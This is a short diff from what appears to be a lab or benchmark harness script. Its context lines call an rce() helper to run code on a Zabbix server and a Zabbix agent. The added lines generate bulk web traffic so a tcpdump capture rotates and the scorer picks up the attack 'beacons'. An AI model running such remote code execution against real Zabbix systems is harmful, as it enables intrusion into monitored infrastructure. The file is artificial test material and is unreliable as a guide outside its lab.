@@ -78,4 +78,12 @@ def rce(execute_on: int, goal: str) -> None:
 
 rce(1, "execute-server")   # execute_on=1: the Zabbix server host
 rce(0, "execute-agent")    # execute_on=0: the agent, via the seeded interface
+
+# rotate the capture chunk so the beacons land in a HARVESTED chunk: tcpdump
+# rotates by size and scoring reads only rotated chunks (the refchains
+# lesson), so push >1.5 MB of lab traffic after the beacons (CAPTURE_CHUNK_MB
+# is 1 in the build and battery contexts)
+total = 0
+while total < 1_500_000:
+    total += len(urllib.request.urlopen(f"{WEB}/index.php", timeout=30).read())
 PY
